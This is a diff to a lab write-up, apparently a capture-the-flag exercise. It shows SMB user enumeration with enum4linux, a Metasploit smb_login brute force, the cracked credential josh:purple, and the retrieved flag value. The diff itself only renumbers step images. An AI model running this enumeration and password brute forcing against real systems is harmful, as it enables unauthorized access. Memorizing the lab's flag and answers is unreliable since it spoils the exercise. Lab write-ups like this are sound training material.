@@ -34,11 +34,14 @@ We start by using `enum4linux` to enumerate valid users on the SMB service.
 ```bash
 enum4linux -a target.ine.local
 ```
+![Step 1](./7.png)
+
 The tool successfully identified local users:
 - `josh`
 - `bob`
 - `nancy`
 - `alice`
+![Step 1](./8.png)
 
 ### 🔹 Step : Launch Metasploit and Load SMB Login Module
 
@@ -47,7 +50,7 @@ msfconsole -q
 use auxiliary/scanner/smb/smb_login
 set RHOSTS target.ine.local
 ```
-![Step 1](./1.png)
+![Step 2](./1.png)
 
 ### 🔹 Step 3: Create a User Wordlist
 
@@ -58,7 +61,7 @@ bob
 nancy
 alice
 ```
-![Step 2](./2.png)
+![Step 3](./2.png)
 
 ### 🔹 Step 4: Set Wordlists in Metasploit
 ```bash
@@ -66,13 +69,13 @@ set USER_FILE users.txt
 set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
 run
 ```
-![Step 3](./3.png)
+![Step 4](./3.png)
 
 ### 🔹 Step 5: Valid Credentials Found
 ```yaml
 josh : purple
 ```
-![Step 4](./4.png)
+![Step 5](./4.png)
 
 ### 🔹 Step 6: Access SMB Share Using `smbclient`
 ```bash
@@ -83,7 +86,7 @@ Password: purple
 ls
 get flag2.txt
 ```
-![Step 5](./5.png)
+![Step 6](./5.png)
 
 ### 🔹 Step 7: View the Retrieved Flag
 ```bash
@@ -95,7 +98,7 @@ FLAG2{a744a6f69c0747398f2648e10f32b8d4}
 ```
 Also contains a hint for the next step:
 Psst! I heard there is an FTP service running. Find it and check the banner.
-![Step 6](./6.png)
+![Step 7](./6.png)
 
 ## Conclusion
 This challenge demonstrates how password spraying and brute-force attacks using Metasploit can help identify weak credentials on SMB services — which in real environments can lead to full network compromise.
